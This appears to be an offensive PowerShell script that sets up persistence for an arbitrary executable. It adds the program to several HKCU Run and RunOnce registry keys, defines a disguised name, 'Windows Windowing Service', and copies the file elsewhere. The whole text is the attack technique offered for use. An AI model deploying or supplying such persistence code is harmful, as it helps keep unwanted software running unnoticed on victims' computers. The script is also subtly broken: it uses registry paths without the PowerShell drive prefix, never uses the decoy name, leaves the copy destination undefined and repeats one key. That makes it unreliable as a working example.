#Commands to add exe to registry

$PathtoExe = "C:\Users\user\Documents\tool.exe"
$DecoyName = "Windows Windowing Service"

#####User 


$Reg = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"

#Only works on 64 bt
$Reg = "HKCU\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"

$Reg = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run"
New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
#Run the program once, then clears after run
$Reg = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce "
New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"

$Reg = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run"
New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"

Copy-Item -path $PathtoExe -Destination $Dest
